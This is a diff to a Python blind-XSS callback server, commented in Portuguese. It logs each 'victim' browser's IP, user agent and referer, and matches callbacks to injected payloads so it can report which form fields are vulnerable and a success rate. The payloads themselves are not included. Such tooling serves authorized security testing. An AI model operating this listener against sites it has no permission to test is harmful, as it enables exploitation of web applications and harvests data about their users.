@@ -18,13 +18,78 @@ payload_tracker = {
 class XSSRequestHandler(http.server.BaseHTTPRequestHandler):
     # Esta função é chamada automaticamente quando chega um pedido GET (como o do fetch).
     def do_GET(self):
-        print("\n[!!!] BLIND XSS CONFIRMADO! Chamada recebida!")
-        print(f"[+] O pedido veio de: {self.client_address[0]}")
-        print(f"[+] Alvo do pedido: {self.path}") # Podemos até passar info no URL
+        try:
+            # Analisa a URL e extrai parâmetros
+            parsed_url = urlparse(self.path)
+            query_params = parse_qs(parsed_url.query)
+            
+            print("\n[!!!] BLIND XSS CONFIRMADO! Chamada recebida!")
+            print(f"[+] O pedido veio de: {self.client_address[0]}")
+            print(f"[+] Caminho completo: {self.path}")
+            print(f"[+] Timestamp: {datetime.now().isoformat()}")
+            
+            # Extrai o ID do payload se presente
+            payload_id = None
+            if 'id' in query_params:
+                payload_id = query_params['id'][0]
+                print(f"[+] Payload ID identificado: {payload_id}")
+                
+                # Correlaciona com payload injetado
+                if payload_id in payload_tracker['injected']:
+                    payload_info = payload_tracker['injected'][payload_id]
+                    print(f"[+] Correlação encontrada!")
+                    print(f"    Campo alvo: {payload_info['campo_name']} ({payload_info['campo_id']})")
+                    print(f"    URL origem: {payload_info['url_origem']}")
+                    print(f"    Payload: {payload_info['payload']}")
+                    print(f"    Injetado em: {payload_info['timestamp']}")
+                else:
+                    print(f"[!] Payload ID não encontrado no tracker")
+            
+            # Registra o callback recebido
+            self._registrar_callback_recebido(payload_id, parsed_url, query_params)
+            
+        except Exception as e:
+            print(f"[!] Erro ao processar callback: {e}")
         
         # Enviamos uma resposta OK para o navegador da vítima.
         self.send_response(200)
+        self.send_header('Content-type', 'text/html')
         self.end_headers()
+        self.wfile.write(b'OK')
+    
+    def _registrar_callback_recebido(self, payload_id, parsed_url, query_params):
+        """Registra informações detalhadas do callback recebido."""
+        callback_id = str(uuid.uuid4())[:8]
+        timestamp = datetime.now().isoformat()
+        
+        callback_info = {
+            'callback_id': callback_id,
+            'timestamp': timestamp,
+            'payload_id': payload_id,
+            'client_ip': self.client_address[0],
+            'client_port': self.client_address[1],
+            'path': parsed_url.path,
+            'query_params': dict(query_params),
+            'full_url': self.path,
+            'user_agent': self.headers.get('User-Agent', 'Unknown'),
+            'referer': self.headers.get('Referer', 'Unknown'),
+            'status': 'received'
+        }
+        
+        # Armazena no tracker
+        payload_tracker['received'][callback_id] = callback_info
+        
+        # Se payload_id existe, marca como executado
+        if payload_id and payload_id in payload_tracker['injected']:
+            payload_tracker['injected'][payload_id]['status'] = 'executed'
+            payload_tracker['injected'][payload_id]['callback_id'] = callback_id
+            payload_tracker['injected'][payload_id]['executed_at'] = timestamp
+        
+        print(f"[+] Callback registrado: {callback_id}")
+    
+    def log_message(self, format, *args):
+        """Suprime logs padrão do servidor HTTP para manter saída limpa."""
+        pass
 
 # Esta função prepara e inicia o nosso servidor numa thread separada.
 def iniciar_servidor_ouvinte(porta):
@@ -81,7 +146,37 @@ def obter_status_tracking():
     total_injetados = len(payload_tracker['injected'])
     total_recebidos = len(payload_tracker['received'])
     
+    # Conta quantos payloads foram executados com sucesso
+    executados = sum(1 for p in payload_tracker['injected'].values() if p['status'] == 'executed')
+    
     return {
         'total_injetados': total_injetados,
-        'total_recebidos': total_recebidos
-        }
+        'total_recebidos': total_recebidos,
+        'total_executados': executados,
+        'taxa_sucesso': f"{(executados/total_injetados*100):.1f}%" if total_injetados > 0 else "0%"
+    }
+
+def obter_payloads_executados():
+    """Retorna apenas os payloads que foram executados com sucesso."""
+    return {k: v for k, v in payload_tracker['injected'].items() if v['status'] == 'executed'}
+
+def obter_relatorio_detalhado():
+    """Retorna relatório completo do teste de Blind XSS."""
+    status = obter_status_tracking()
+    executados = obter_payloads_executados()
+    
+    relatorio = {
+        'resumo': status,
+        'payloads_injetados': payload_tracker['injected'].copy(),
+        'callbacks_recebidos': payload_tracker['received'].copy(),
+        'payloads_executados': executados,
+        'campos_vulneraveis': list(set(p['campo_name'] for p in executados.values()))
+    }
+    
+    return relatorio
+
+def limpar_tracking():
+    """Limpa todos os dados de tracking."""
+    payload_tracker['injected'].clear()
+    payload_tracker['received'].clear()
+    print("[*] Dados de tracking limpos.")
